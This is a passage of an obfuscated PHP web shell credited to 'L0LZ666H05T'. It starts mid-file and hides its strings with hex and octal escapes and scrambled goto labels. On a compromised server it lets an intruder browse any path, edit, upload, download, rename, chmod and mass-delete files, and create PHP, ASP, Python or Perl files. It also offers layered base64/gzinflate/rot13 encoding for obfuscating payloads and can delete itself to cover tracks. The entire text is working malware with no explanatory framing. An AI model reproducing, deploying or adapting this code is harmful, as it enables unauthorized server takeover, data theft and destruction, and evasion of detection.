    <?php  die; } } goto hLAYf; xoXmm: function download($post, $filename) { if ($_GET["\x64\157"] == $post) { @ob_clean(); header("\x43\157\x6e\164\145\x6e\164\55\x44\x65\163\x63\162\x69\160\x74\151\x6f\156\72\40\x46\151\154\145\40\x54\162\141\x6e\x73\x66\145\x72"); header("\103\157\156\164\x65\x6e\x74\x2d\x54\x79\160\145\x3a\x20\x61\x70\x70\154\151\143\141\164\x69\x6f\156\57\157\x63\x74\x65\164\55\163\164\162\x65\x61\155"); header("\103\x6f\156\164\145\x6e\164\x2d\x44\151\x73\160\x6f\x73\x69\x74\x69\x6f\156\x3a\x20\141\164\164\141\x63\x68\155\145\156\x74\73\40\146\151\x6c\x65\156\141\x6d\145\75\x22" . basename($filename) . "\42"); header("\x45\x78\x70\x69\162\145\163\x3a\x20\x30"); header("\x43\x61\143\x68\145\55\103\x6f\156\x74\x72\157\x6c\72\x20\155\165\163\x74\55\x72\x65\166\141\x6c\x69\144\x61\x74\145"); header("\120\162\x61\x67\155\141\72\40\160\165\142\x6c\x69\x63"); header("\103\x6f\x6e\164\145\156\x74\x2d\114\145\156\x67\x74\x68\x3a\40" . filesize($filename)); readfile($filename); @readfile($filename); die(0); } } goto JXj23; LPY01: function success($text) { ?>
  <center>
  <div class="alert alert-success" role="alert">
    <?php  print $text; ?>
  </div>
  </center>
  <?php  } goto MK72S; Xg1TT: print @cwd(); goto BP0hs; J3sr5: foreach ($getPATH as $file) { if (!is_file($file)) { continue; } ?>
  <tr class="hover">
  <?php  print "\74\x74\x64\x20\x63\154\x61\x73\x73\75\x27\151\x6d\147\x27\76\74\151\155\147\x20\x73\x72\x63\x3d\x27"; $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION)); if ($ext == "\x70\150\x70") { echo "\150\x74\x74\x70\x73\72\57\57\x69\155\x61\147\x65\56\146\154\x61\164\x69\143\x6f\156\56\x63\157\x6d\57\x69\143\x6f\156\x73\57\x70\x6e\147\x2f\x31\x32\x38\57\x33\x33\67\x2f\x33\63\67\71\x34\x37\x2e\x70\156\x67"; } elseif ($ext == "\x68\164\155\x6c") { echo "\150\x74\164\160\163\72\x2f\x2f\151\155\141\147\145\56\x66\x6c\141\164\x69\143\x6f\x6e\x2e\x63\x6f\x6d\x2f\151\143\x6f\156\x73\x2f\x70\156\x67\57\61\62\70\57\61\x33\x36\x2f\x31\x33\x36\65\62\x38\56\160\156\x67"; } elseif ($ext == "\x63\163\x73") { echo "\x68\164\164\160\163\x3a\x2f\x2f\x69\155\x61\147\x65\x2e\x66\x6c\141\x74\x69\x63\x6f\x6e\x2e\x63\157\x6d\x2f\151\x63\x6f\x6e\163\57\x70\x6e\147\57\61\x32\70\57\x31\63\66\x2f\x31\x33\x36\65\x32\x37\x2e\x70\x6e\147"; } elseif ($ext == "\160\156\147") { echo "\150\164\x74\160\163\72\x2f\x2f\151\x6d\x61\x67\x65\x2e\146\154\x61\164\151\143\x6f\156\56\143\157\x6d\x2f\x69\143\157\156\x73\57\x70\156\147\x2f\61\62\70\57\x31\x33\66\x2f\61\x33\66\x35\x32\63\x2e\x70\156\147"; } elseif ($ext == "\x6a\x70\147") { echo "\x68\x74\x74\x70\x73\x3a\x2f\x2f\151\155\x61\x67\x65\56\146\x6c\141\164\x69\x63\x6f\156\56\x63\157\155\57\151\143\157\156\x73\x2f\x70\x6e\147\x2f\61\x32\70\x2f\x31\63\x36\x2f\61\63\66\65\62\64\56\x70\156\x67"; } elseif ($ext == "\x6a\160\x65\x67") { echo "\x68\x74\164\x70\72\x2f\x2f\x69\56\x69\155\147\165\x72\56\143\157\155\x2f\x65\x38\155\x6b\x76\x50\x66\56\160\x6e\x67\x22"; } elseif ($ext == "\x7a\151\x70") { echo "\150\x74\x74\160\x73\72\57\57\x69\x6d\141\147\x65\56\146\154\x61\164\151\143\x6f\x6e\56\143\157\x6d\x2f\x69\143\157\156\x73\57\x70\x6e\147\x2f\61\x32\x38\x2f\x31\63\66\57\61\x33\66\x35\x34\x34\56\160\156\147"; } elseif ($ext == "\x6a\x73") { echo "\150\164\x74\160\x73\x3a\x2f\57\151\155\x61\147\145\56\146\154\141\x74\151\143\x6f\156\56\143\x6f\155\57\151\143\x6f\x6e\163\x2f\x70\156\147\x2f\61\x32\x38\x2f\61\x31\62\x36\57\x31\61\62\x36\70\x35\x36\56\160\x6e\147"; } elseif ($ext == "\x74\164\x66") { echo "\150\164\x74\x70\163\x3a\57\x2f\x69\x6d\x61\147\145\x2e\x66\154\141\x74\151\x63\157\x6e\56\x63\157\x6d\57\151\x63\157\156\x73\57\160\x6e\x67\x2f\61\62\x38\57\x31\61\x32\66\x2f\x31\61\62\x36\x38\71\x32\56\x70\x6e\147"; } elseif ($ext == "\x6f\164\x66") { echo "\150\164\164\160\x73\72\x2f\57\151\155\x61\x67\145\x2e\146\154\141\164\x69\143\x6f\x6e\x2e\x63\x6f\x6d\57\151\143\157\x6e\x73\x2f\160\156\x67\x2f\61\x32\x38\x2f\x31\61\x32\x36\x2f\61\61\62\x36\x38\71\x31\x2e\160\x6e\147"; } elseif ($ext == "\x74\170\x74") { echo "\x68\x74\164\160\163\72\57\x2f\x69\155\x61\147\x65\x2e\146\154\x61\164\x69\x63\x6f\x6e\56\x63\157\155\x2f\151\143\157\x6e\163\57\160\156\x67\57\x31\x32\x38\x2f\61\63\x36\57\61\63\x36\65\x33\70\x2e\160\x6e\x67"; } elseif ($ext == "\151\x63\157") { echo "\x68\x74\x74\160\x73\x3a\57\57\151\155\x61\147\145\56\x66\x6c\141\x74\x69\143\157\156\x2e\x63\x6f\x6d\x2f\x69\x63\x6f\x6e\163\x2f\160\156\147\57\61\x32\70\57\61\61\x32\66\57\61\x31\x32\66\x38\x37\63\56\x70\x6e\147"; } elseif ($ext == "\x63\x6f\x6e\146") { echo "\x68\x74\164\160\163\x3a\x2f\57\x69\x6d\141\x67\145\56\146\154\x61\164\x69\x63\157\156\x2e\x63\157\155\57\151\x63\157\x6e\x73\57\x70\x6e\147\x2f\x35\x31\62\57\x31\x35\67\63\57\x31\65\x37\63\x33\60\x31\x2e\x70\x6e\x67"; } elseif ($ext == "\150\164\141\x63\143\x65\163\163") { echo "\150\x74\x74\160\163\x3a\x2f\x2f\151\155\x61\x67\145\x2e\146\154\x61\x74\x69\143\157\156\56\143\157\155\x2f\151\143\x6f\x6e\x73\x2f\160\x6e\147\x2f\x31\x32\x38\57\61\x37\62\60\57\x31\67\62\60\x34\64\x34\x2e\160\x6e\147"; } elseif ($ext == "\163\150") { echo "\x68\x74\164\160\x73\72\x2f\x2f\x69\155\x61\147\x65\x2e\146\x6c\x61\x74\151\x63\157\x6e\x2e\x63\157\x6d\x2f\151\143\157\156\163\x2f\x70\156\x67\57\x31\62\70\57\66\x31\67\x2f\x36\61\67\65\63\65\56\160\x6e\147"; } elseif ($ext == "\x70\x79") { echo "\x68\164\164\x70\163\x3a\57\57\151\x6d\x61\x67\x65\x2e\146\154\x61\x74\151\x63\157\x6e\x2e\143\x6f\155\57\x69\143\x6f\x6e\x73\x2f\x70\x6e\147\57\x31\x32\x38\57\x31\70\60\x2f\x31\70\60\70\x36\x37\x2e\x70\x6e\147"; } elseif ($ext == "\x69\x6e\x64\x73\x63") { echo "\x68\x74\x74\x70\163\72\57\57\151\155\141\147\x65\56\146\x6c\x61\x74\151\143\x6f\156\56\x63\157\x6d\x2f\151\143\157\156\163\57\160\x6e\x67\57\65\61\62\57\x31\x32\66\x35\x2f\61\x32\x36\x35\65\61\61\56\160\x6e\147"; } elseif ($ext == "\x73\x71\154") { echo "\x68\164\x74\160\163\x3a\x2f\x2f\151\x6d\147\56\x69\143\157\x6e\x73\x38\56\143\x6f\x6d\x2f\165\154\164\162\x61\166\151\157\154\145\x74\57\62\x78\x2f\x64\141\x74\x61\x2d\143\x6f\156\x66\x69\x67\x75\162\x61\x74\x69\157\156\56\x70\156\x67"; } elseif ($ext == "\x70\x6c") { echo "\x68\x74\164\x70\72\57\x2f\151\x2e\x69\x6d\147\x75\x72\x2e\x63\x6f\x6d\x2f\120\x6e\155\x58\x38\x48\x39\x2e\160\x6e\147"; } elseif ($ext == "\x70\x64\x66") { echo "\150\164\164\160\x73\72\x2f\x2f\151\155\141\147\145\x2e\x66\x6c\x61\164\151\143\x6f\156\56\x63\x6f\155\57\151\143\x6f\x6e\163\57\160\156\x67\x2f\x31\62\x38\57\x31\63\x36\57\x31\x33\x36\x35\62\x32\56\x70\156\x67"; } elseif ($ext == "\155\160\x34") { echo "\150\164\x74\x70\163\x3a\57\x2f\x69\155\x61\x67\x65\x2e\146\154\141\164\151\143\157\156\x2e\x63\x6f\x6d\57\151\x63\157\x6e\x73\57\160\156\x67\x2f\x31\62\x38\57\x31\63\x36\x2f\61\63\x36\65\64\65\56\x70\x6e\147"; } elseif ($ext == "\155\160\63") { echo "\150\x74\x74\160\163\x3a\x2f\57\151\155\141\x67\x65\x2e\x66\x6c\x61\164\x69\143\157\x6e\x2e\x63\157\155\x2f\151\143\157\x6e\163\57\160\x6e\x67\57\x31\x32\70\x2f\61\x33\x36\57\x31\x33\x36\x35\x34\x38\56\x70\x6e\147"; } elseif ($ext == "\147\x69\164") { echo "\x68\164\x74\160\x73\x3a\x2f\57\x69\x6d\x61\147\x65\x2e\146\x6c\141\x74\151\x63\157\156\56\143\x6f\x6d\57\x69\143\157\156\x73\x2f\160\x6e\x67\x2f\x31\62\70\57\66\61\x37\57\x36\x31\67\65\60\x39\x2e\x70\156\x67"; } elseif ($ext == "\x6d\144") { echo "\x68\164\164\x70\163\x3a\x2f\57\151\155\x61\x67\x65\x2e\146\x6c\x61\164\x69\143\x6f\156\56\x63\x6f\155\57\151\x63\x6f\156\x73\x2f\160\156\x67\x2f\x31\x32\70\57\66\x31\67\57\x36\61\x37\65\62\x30\x2e\x70\x6e\x67"; } else { echo "\150\x74\x74\x70\x73\x3a\x2f\x2f\x69\x6d\x61\x67\x65\56\146\154\x61\x74\x69\143\x6f\x6e\56\143\x6f\x6d\57\151\x63\x6f\x6e\163\57\x73\x76\x67\x2f\x38\63\x33\57\70\x33\x33\x35\62\x34\56\x73\166\x67"; } print "\47\40\143\x6c\x61\163\163\75\47\x69\143\157\156\47\76\74\x2f\151\x6d\x67\76\x3c\x2f\x74\x64\76"; if (strlen($file) > 25) { $_file = substr($file, 0, 25) . "\x2e\56\56\55\x2e" . $ext; } else { $_file = $file; } ?>
    <td>
      <?php  print $file; ?>
    </td>
    </td>
    <td>
      <center>
        <?php  print @permission($file, @perms($file)); ?>
      </center>
    </td>
    <td>
      <center>
        <?php  print @size($file); ?>
      </center>
    </td>
    <td>
      <center>
        <select style="float:right;" onclick="if (this.value) window.location=(this.value)">
        <option value="" selected>Choose . .</option>
        <option value="?path=<?php  print @cwd(); ?>
&do=edit&file=<?php  print @cwd() . DIRECTORY_SEPARATOR . $file; ?>
">Edit</option>
        <option value="?path=<?php  print @cwd(); ?>
&do=rename&file=<?php  print @cwd() . DIRECTORY_SEPARATOR . $file; ?>
">Rename</option>
        <option value="?path=<?php  print @cwd(); ?>
&do=delete&file=<?php  print @cwd() . DIRECTORY_SEPARATOR . $file; ?>
">Delete</option>
        <option value="?path=<?php  print @cwd(); ?>
&do=chmod&file=<?php  print @cwd() . DIRECTORY_SEPARATOR . $file; ?>
">Chmod</option>
        <option value="?path=<?php  print @cwd(); ?>
&do=backup&file=<?php  print @cwd() . DIRECTORY_SEPARATOR . $file; ?>
">Backup</option>
        <option value="?path=<?php  print @cwd(); ?>
&do=download&file=<?php  print @cwd() . DIRECTORY_SEPARATOR . $file; ?>
">Download</option>
      </select>
      </center>
    </center>
    </td>
  </tr>
  <?php  } goto NefAm; lh27T: ?>
&do=masswrite">Replace File</a>
        <a class="tools" href="?path=<?php  goto I9D29; JXj23: function backup($post, $filename) { if ($_GET["\x64\157"] == $post) { $file = @file_get_contents($filename); $fp = @fopen($filename . "\56\142\141\153", "\167"); @fwrite($fp, $file); @fclose($fp); } } goto S9ph2; f0JYd: function perms($filename) { $perms = fileperms($filename); switch ($perms & 61440) { case 49152: $info = "\163"; break; case 40960: $info = "\x6c"; break; case 32768: $info = "\x72"; break; case 24576: $info = "\142"; break; case 16384: $info = "\x64"; break; case 8192: $info = "\143"; break; case 4096: $info = "\160"; break; default: $info = "\x75"; } $info .= $perms & 256 ? "\x72" : "\x2d"; $info .= $perms & 128 ? "\x77" : "\55"; $info .= $perms & 64 ? $perms & 2048 ? "\163" : "\170" : ($perms & 2048 ? "\x53" : "\55"); $info .= $perms & 32 ? "\x72" : "\55"; $info .= $perms & 16 ? "\x77" : "\x2d"; $info .= $perms & 8 ? $perms & 1024 ? "\163" : "\170" : ($perms & 1024 ? "\x53" : "\x2d"); $info .= $perms & 4 ? "\x72" : "\55"; $info .= $perms & 2 ? "\167" : "\55"; $info .= $perms & 1 ? $perms & 512 ? "\164" : "\x78" : ($perms & 512 ? "\x54" : "\55"); return $info; } goto MeY23; sVpDj: function chmods($post, $filename) { if ($_GET["\144\157"] == $post) { if (isset($_POST["\163\165\x62\x6d\x69\x74"])) { if (@chmod($filename, $_POST["\x6d\157\x64\145"])) { ?>
        <tr>
            <td>
                <?php  print @success("\103\150\x6d\x6f\x64\40\123\165\143\143\145\163\x73"); ?>
            </td>
        </tr>
        <?php  } else { ?>
        <tr>
            <td>
                <?php  print @failed("\x43\x68\x6d\157\x64\x20\x46\141\151\154\145\144"); ?>
            </td>
        </tr>
        <?php  } } ?>
    <thead>
      <tr>
        <th>
          <a class="back" href="?path=<?php  print @cwd(); ?>
">CHANGE MODE</a>
        </th>
      </tr>
    </thead>
    <form method="post">
      <tr>
        <td>
          <input style="width:98.5%;" type="text" name="mode" value="<?php  print @substr(sprintf("\45\x6f", @fileperms($filename)), -4); ?>
">
        </td>
      </tr>
      <tr>
        <td>
          <input style="width:100%;" type="submit" name="submit">
        </td>
      </tr>
    </form>
    <?php  die; } } goto X6MCC; Vj5wx: if (isset($_GET["\145\156\x63\157\x64\x65"])) { ?>
    <thead>
      <tr>
        <th colspan="2">
          <a class="back" href="?path=<?php  print @cwd(); ?>
">ENCODE</a>
        </th>
      </tr>
    </thead>
    <form method="post">
    <tr>
      <td colspan="2">
        <textarea name="text"></textarea>
      </td>
    </tr>
    <tr>
      <td>
        <select name="mode" style="width:100%;">
          <option value="urlencode">url</option>
          <option value="base64">Base64</option>
          <option value="ur">base64 - convert_uu</option>
          <option value="gzinflates">gzinflate - base64</option>
          <option value="str2">str_rot13 - base64</option>
          <option value="gzinflate">str_rot13 - gzinflate - base64</option>
          <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
          <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
        </select>
      </td>
      <td>
        <input style="width:100%;" type="submit" name="submit" value="ENCODE">
      </td>
    </tr>
    </form>
    <?php  if (isset($_POST["\163\165\142\155\x69\x74"])) { encode($_POST["\164\145\x78\x74"], $_POST["\155\157\144\x65"]); } die; } goto Q7FSq; S9ph2: function killme($post) { if ($_GET["\144\157"] == "\x6b\x69\154\154\155\145") { $killme = unlink(@cwd() . DIRECTORY_SEPARATOR . $_SERVER["\120\x48\x50\137\123\x45\114\106"]); if ($killme) { ?>
      <tr>
        <td colspan="5">
          <?php  print @success("\x47\x6f\x6f\x64\x20\x42\x79\x65\x20\72\x29"); ?>
          <?php  print @home(); ?>
        </td>
      </tr>
      <?php  die; } else { ?>
      <tr>
        <td colspan="5">
          <?php  print @failed("\120\145\x72\155\151\x73\x73\x69\157\156\x20\x44\141\156\x69\x65\x64"); ?>
        </td>
      </tr>
      <?php  die; } } } goto AiEdo; zdz5L: function makedir($filename) { return @mkdir($filename); } goto Vj5wx; Gs7k_: function size($file) { $bytes = @filesize($file); if ($bytes >= 1073741824) { return @number_format($bytes / 1073741824, 2) . "\40\107\102"; } elseif ($bytes >= 1048576) { return @number_format($bytes / 1048576, 2) . "\40\x4d\102"; } elseif ($bytes >= 1024) { return @number_format($bytes / 1024, 2) . "\x20\x4b\x42"; } elseif ($bytes > 1) { return $bytes . "\x20\x62\x79\164\x65\x73"; } elseif ($bytes == 1) { return "\x31\40\142\171\164\x65"; } else { return "\x30\40\142\171\x74\145\163"; } } goto LPY01; vgQi0: ?>
&do=logout">Logout</a>
      </th>
    </tr>
    <tr>
      <th colspan="5">
            <?php  goto N2RWx; HuhMu: print @cwd(); goto lh27T; cI3DH: print @cwd(); goto lvIPT; Dwt1C: function cwd() { if (isset($_GET["\x70\x61\164\150"])) { $cwd = @str_replace("\134", DIRECTORY_SEPARATOR, $_GET["\x70\141\164\150"]); @chdir($cwd); } else { $cwd = @str_replace("\x5c", DIRECTORY_SEPARATOR, @getcwd()); } return $cwd; } goto IZ7XM; rRjMo: @renames("\x72\x65\156\141\x6d\145", $_GET["\146\x69\x6c\145"]); goto u_dh8; kCWK6: ?>
 )
      </th>
    </tr>
  </thead>
  <tbody>
<?php  goto MToK0; brW3q: @killme("\153\151\154\x6c\155\x65"); goto V4TVo; hLAYf: function renames($post, $filename) { if ($_GET["\144\x6f"] == $post) { if (isset($_POST["\163\x75\x62\155\x69\164"])) { if (@rename($filename, $_POST["\x6e\145\x77\156\x61\x6d\x65"])) { ?>
        <tr>
            <td>
                <?php  print @success("\122\x65\156\x61\155\x65\40\123\165\143\x63\x65\163\163"); ?>
            </td>
        </tr>
        <?php  } else { ?>
        <tr>
            <td>
                <?php  print @failed("\122\145\x6e\x61\155\145\40\x46\x61\151\154\145\144"); ?>
            </td>
        </tr>
        <?php  } } ?>
    <thead>
      <tr>
        <th>
          <a class="back" href="?path=<?php  print @cwd(); ?>
">RENAME</a>
        </th>
      </tr>
    </thead>
    <form method="post">
      <tr>
        <td>
          <input style="width:98.6%;" type="text" name="newname" value="<?php  print @basename($filename); ?>
">
        </td>
      </tr>
      <tr>
        <td>
          <input style="width:100%;" type="submit" name="submit" value="RENAME">
        </td>
      </tr>
    </form>
    <?php  die; } } goto sVpDj; SOEdG: @backup("\x62\141\x63\x6b\x75\x70", $_GET["\146\x69\x6c\145"]); goto ItmuI; N2RWx: print pwd(); goto qbU7g; Ib0M3: @upload("\x75\x70\x6c\x6f\x61\144"); goto ELlyH; AG1pq: print @cwd(); goto p_Q76; BP0hs: ?>
&do=upload">Upload</a>
        <a class="tools" href="?path=<?php  goto AG1pq; i896O: function massdelete($dir, $type) { if (is_writable($dir)) { $getfile = scandir($dir); foreach ($getfile as $file) { $path = $dir . DIRECTORY_SEPARATOR . $file; if ($file === "\56" || filetype($path) == "\146\151\154\x65") { if (@preg_match("\x2f" . $type . "\44" . "\57", $file, $matches) != 0 && @preg_match("\57" . $file . "\44\57", $_SERVER["\x50\110\x50\137\x53\105\x4c\x46"], $matches) != 1) { ?>
                    <tr>
                        <td>
                            <div class="alert alert-success">
                                <?php  echo $dir . DIRECTORY_SEPARATOR; ?>
<b><?php  echo $file; ?>
 Delete Successfully !</b>
                            </div>
                        </td>
                    </tr>
                    <?php  unlink($path); } } elseif ($file === "\56\56" || filetype($path) == "\146\151\x6c\145") { if (@preg_match("\57" . $type . "\44" . "\57", $file, $matches) != 0 && @preg_match("\57" . $file . "\x24\x2f", $_SERVER["\x50\110\x50\x5f\x53\105\x4c\x46"], $matches) != 1) { ?>
                    <tr>
                        <td>
                            <div class="alert alert-success">
                                <?php  echo $dir . DIRECTORY_SEPARATOR; ?>
<b><?php  echo $file; ?>
 Delete Successfully !</b>
                            </div>
                        </td>
                    </tr>
                    <?php  unlink($path); } } else { if (is_dir($path)) { if (is_writable($path)) { @unlink($path); massdelete($path, $type); } } } } } } goto wmyL6; ItmuI: @download("\144\157\167\156\154\157\141\144", $_GET["\146\x69\154\145"]); goto Ib0M3; wmyL6: function making($post) { if ($_GET["\144\x6f"] == "\155\141\x6b\151\x6e\x67") { ?>
    <thead>
      <tr>
        <th colspan="2">
          <a class="back" href="?path=<?php  print @cwd(); ?>
">MAKE FILE & DIRECTORY</a>
        </th>
      </tr>
    </thead>
    <?php  if (isset($_POST["\x73\165\x62\155\151\164"])) { if ($_POST["\x74\x79\160\x65"] == "\x66\x69\x6c\x65") { switch ($_POST["\146\151\x6c\x65\x5f\x6e\141\x6d\x65"]) { case "\164\170\164": $_mode = "\x74\170\164"; break; case "\150\164\x6d\154": $_mode = "\150\x74\155\x6c"; break; case "\x70\150\x70": $_mode = "\160\x68\160"; break; case "\143\163\x73": $_mode = "\143\x73\163"; break; case "\x61\x73\160": $_mode = "\141\x73\x70"; break; case "\x6a\163": $_mode = "\x6a\163"; break; case "\x70\x79\164\150\x6f\156": $_mode = "\160\x79"; break; case "\x70\145\162\x6c": $_mode = "\160\154"; break; } if (@makefile($_POST["\146\151\154\145\x6e\141\x6d\x65"] . "\56" . $_mode, $_POST["\x74\145\170\164"])) { ?>
          <tr>
            <td colspan="2">
              <?php  print @failed("\x43\x72\145\x61\x74\x65\40\106\151\154\x65\x20\74\142\76" . $_POST["\146\x69\x6c\145\x6e\141\x6d\x65"] . "\56" . $_mode . "\74\x2f\142\76\x20\x46\x61\151\154\145\x64"); ?>
            </td>
          </tr>
          <?php  } else { ?>
          <tr>
            <td colspan="2">
              <?php  print @success("\x43\x72\145\x61\164\x65\x20\x46\x69\154\x65\x20\74\142\x3e" . $_POST["\x66\x69\154\x65\x6e\x61\155\145"] . "\x2e" . $_mode . "\x3c\x2f\x62\76\x20\123\x75\x63\143\145\x73\163\x66\x75\x6c\x6c\x79"); ?>
            </td>
          </tr>
          <?php  } } if ($_POST["\x74\171\x70\x65"] == "\x64\151\162") { if (@makedir($_POST["\x66\151\x6c\145\x6e\x61\x6d\x65"])) { ?>
          <tr>
            <td>
              <?php  print @success("\x43\x72\145\141\x74\x65\x20\x44\x49\122\105\x43\x54\x4f\122\131\x20" . $_POST["\x66\x69\x6c\x65\x6e\141\155\145"] . "\40\123\x75\143\x63\145\x73\163\146\x75\154\154\171"); ?>
              <?php  print sleep(7); ?>
              <?php  print flush(); ?>
              <?php  print @header("\x4c\x6f\x63\x61\x74\x69\157\x6e\x20\x3a\x20\77\x70\141\164\x68\x3d" . @cwd() . DIRECTORY_SEPARATOR . $_POST["\x66\x69\x6c\145\156\x61\155\145"] . ''); ?>
            </td>
          </tr>
          <?php  } else { ?>
          <tr>
            <td>
              <?php  print @failed("\x43\162\x65\141\x74\x65\40\x44\111\122\105\x43\x54\x4f\122\131\40" . $_POST["\x66\151\154\145\156\141\x6d\145"] . "\40\106\141\151\154\145\144"); ?>
            </td>
          </tr>
          <?php  } } } ?>
    <form method="post">
      <tr>
        <td colspan="2">
          <select style="width:100%;" name="type">
            <option value="file">FILE</option>
            <option value="dir">DIRECTORY</option>
          </select>
        </td>
      </tr>
      <tr>
        <td style="width:50px;">
          <select name="file_name">
            <option value="txt">txt</option>
            <option value="html">html</option>
            <option value="php">php</option>
            <option value="css">css</option>
            <option value="asp">asp</option>
            <option value="js">js</option>
            <option value="python">python</option>
            <option value="perl">pl</option>
          </select>
        </td>
        <td>
          <center>
          <input style="width:98.8%;" type="text" name="filename" placeholder="Filename: ">
        </center>
        </td>
      </tr>
      <tr>
        <td colspan="2">
          <textarea name="text" placeholder="sfx* please empty this textarea if you want create DIRECTORY"></textarea>
        </td>
      </tr>
      <tr>
        <td colspan="2">
          <input style="width:100%;" type="submit" name="submit">
        </td>
      </tr>
    </form>
    <?php  die; } } goto FHX45; NefAm: ?>
</tbody>
<thead>
    <tr>
        <th colspan="5" style="border:none;">&copy; copyright 2019 by L0LZ666H05T</th>
    </tr>
</thead>
</table>
</body>
</html>
